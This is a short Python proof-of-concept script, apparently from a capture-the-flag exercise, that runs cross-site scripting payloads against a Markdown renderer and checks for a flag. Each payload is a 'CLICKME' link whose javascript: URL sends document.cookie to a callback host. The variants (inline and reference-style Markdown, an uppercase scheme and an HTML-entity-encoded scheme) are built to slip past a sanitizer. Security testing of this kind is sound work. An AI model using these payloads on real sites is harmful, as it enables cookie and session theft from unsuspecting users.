import sys
sys.path.insert(0, '.')
from poc_common import run_payload, CB

FLAG = "PCBFLAG_a2196273d558"

seed = "<a href='javascript:document.location=\"" + CB + "\"+document.cookie'>CLICKME</a>"
inline_md = "[CLICKME](" + "javascript:document.location='" + CB + "'+document.cookie)"
ref_md    = "[CLICKME][r]\n\n[r]: " + "javascript:document.location='" + CB + "'+document.cookie"
upper_md  = "[CLICKME](" + "JAVASCRIPT:document.location='" + CB + "'+document.cookie)"
ent_md    = "[CLICKME](&#106;avascript:document.location='" + CB + "'+document.cookie)"

for name, payload in [("SEED(blocked-expected)", seed),
                      ("INLINE-MD", inline_md),
                      ("REF-MD", ref_md),
                      ("UPPER-SCHEME-MD", upper_md),
                      ("ENTITY-MD", ent_md)]:
    r = run_payload(payload, "v1")
    hit = FLAG in r
    print("=== %s === hit=%s dump=%s" % (name, hit, r))
